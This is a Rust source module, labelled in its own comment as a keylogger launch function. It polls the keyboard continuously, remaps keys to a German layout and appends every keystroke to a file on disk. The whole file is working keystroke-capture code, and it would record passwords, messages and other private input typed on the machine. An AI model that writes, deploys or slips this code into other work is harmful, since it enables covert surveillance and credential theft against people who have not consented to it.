use device_query::{DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::io::Write;

use crate::constants::FILTER_KEYS;

/// Keylogger launch function
pub fn run(path: String) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    let filter_keys: Vec<String> = FILTER_KEYS.iter().map(|v| v.to_string()).collect();

    loop {
        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            // Filter out unwanted single keys
            if keys.len() == 1 {
                if filter_keys.contains(&format!("{:?}", keys[0])) {
                    continue;
                }

                let s = format!("{:?}", keys[0]).to_lowercase();

                // remap to german
                let s: &str = match keys[0] {
                    Keycode::Z => "y",
                    Keycode::Y => "z",
                    Keycode::Minus => "ß",
                    Keycode::Equal => "´",
                    Keycode::RightBracket => "+",
                    Keycode::BackSlash => "#",
                    Keycode::Comma => ",",
                    Keycode::Dot => ".",
                    Keycode::Slash => "-",
                    _ => &s,
                };
                info!("writing {}", s);

                write!(file, "{}", s).expect("Failed to write to file");
            } else if keys.len() == 2 {
                // Handle dual key info

                let s0 = format!("{:?}", keys[0]).to_lowercase();
                let s1 = format!("{:?}", keys[1]).to_lowercase();
                debug!("s0: {}, s1: {}", s0, s1);

                if &s1 == "lshift" {
                    let s = match keys[0] {
                        Keycode::Key0 => "=",
                        Keycode::Key1 => "!",
                        Keycode::Key2 => "\"",
                        Keycode::Key3 => "§",
                        Keycode::Key4 => "$",
                        Keycode::Key5 => "%",
                        Keycode::Key6 => "&",
                        Keycode::Key7 => "/",
                        Keycode::Key8 => "(",
                        Keycode::Key9 => ")",
                        Keycode::Minus => "?",
                        Keycode::RightBracket => "*",
                        Keycode::LeftBracket => "",
                        Keycode::Equal => "`",
                        Keycode::Semicolon => "",
                        Keycode::Apostrophe => "",
                        _ => &s0,
                    };
                    info!("writing: {}", s);
                    write!(file, "{}", s).expect("Failed to write to file");
                }
                if &s0 == "lshift" {
                    let s = match keys[1] {
                        Keycode::Comma => ";",
                        Keycode::Dot => ":",
                        Keycode::Slash => "_",
                        Keycode::BackSlash => "'",
                        _ => &s1,
                    };
                    info!("writing {}", s);
                    write!(file, "{}", s).expect("Failed to write to file");
                }
            }
        }
        prev_keys = keys;
    }
}
